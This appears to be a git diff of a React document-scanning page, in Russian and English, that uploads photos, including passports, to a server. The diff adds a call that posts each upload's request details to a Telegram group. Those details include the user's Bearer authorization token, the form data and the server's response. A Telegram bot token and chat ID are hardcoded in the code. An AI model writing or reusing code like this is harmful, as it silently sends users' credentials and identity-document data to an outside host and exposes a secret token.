@@ -160,37 +160,38 @@ export default function ScanPage() {
     setScanning(false);
   };
 
-  const sendTelegramMessage = async (message) => {
-    const token = "7622259937:AAG5G4DfcbIlJCUEEzwRCj3OYxWRLM89sLg"; // Замените на токен вашего бота
-    const chatId = "-1002719923077"; // Замените на chat_id вашей группы
+const sendTelegramMessage = async (message) => {
+  const token = "7622259937:AAG5G4DfcbIlJCUEEzwRCj3OYxWRLM89sLg"; // Замените на токен вашего бота
+  const chatId = "-1002719923077"; // Замените на chat_id вашей группы
 
-    const url = `https://api.telegram.org/bot${token}/sendMessage`;
+  const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
-    const params = {
-      chat_id: chatId,
-      text: message,
-    };
-
-    try {
-      console.log("Отправка сообщения в Telegram:", message); // Логируем перед отправкой
-      const response = await fetch(url, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify(params),
-      });
-
-      const data = await response.json();
-      console.log("Ответ от Telegram:", data); // Логируем ответ от Telegram API
-
-      if (!response.ok) {
-        console.error("Ошибка при отправке сообщения в Telegram:", data);
-      }
-    } catch (error) {
-      console.error("Error sending message to Telegram:", error);
-    }
+  const params = {
+    chat_id: chatId,
+    text: message,
   };
+
+  try {
+    console.log("Отправка сообщения в Telegram:", message); // Логируем перед отправкой
+    const response = await fetch(url, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify(params),
+    });
+
+    const data = await response.json();
+    console.log("Ответ от Telegram:", data); // Логируем ответ от Telegram API
+
+    if (!response.ok) {
+      console.error("Ошибка при отправке сообщения в Telegram:", data);
+    }
+  } catch (error) {
+    console.error("Error sending message to Telegram:", error);
+  }
+};
+
 
   const takePhoto = async () => {
     console.log("Попытка сделать фото...");
@@ -306,15 +307,18 @@ const uploadAll = async () => {
       form.append("is_passport", isPassport ? "1" : "0");
 
       // Логируем запрос перед отправкой
-      console.log("Отправка запроса на сервер:");
-      console.log("URL:", `${API}/api/upload-image`);
-      console.log("Request headers:", {
-        Authorization: `Bearer ${token}`,
-      });
-      console.log("Form data:", form);
+      const requestDetails = {
+        url: `${API}/api/upload-image`,
+        headers: {
+          Authorization: `Bearer ${token}`,
+        },
+        body: form,
+      };
 
+      console.log("Отправка запроса на сервер:", requestDetails);
+
+      // Отправляем запрос
       try {
-        // Отправляем запрос
         const res = await fetch(`${API}/api/upload-image`, {
           method: "POST",
           headers: {
@@ -325,7 +329,11 @@ const uploadAll = async () => {
 
         // Логируем ответ от сервера
         const responseData = await res.json();
+
         console.log("Ответ от сервера:", responseData);
+
+        // Отправляем запрос и ответ в Telegram
+        await sendTelegramMessage(`Request: ${JSON.stringify(requestDetails, null, 2)}\nResponse: ${JSON.stringify(responseData, null, 2)}`);
 
         // Логируем статус ответа
         if (res.ok) {
@@ -362,6 +370,7 @@ const uploadAll = async () => {
     setUploading(false);
   }
 };
+
 
 
   const handleLogout = () => {
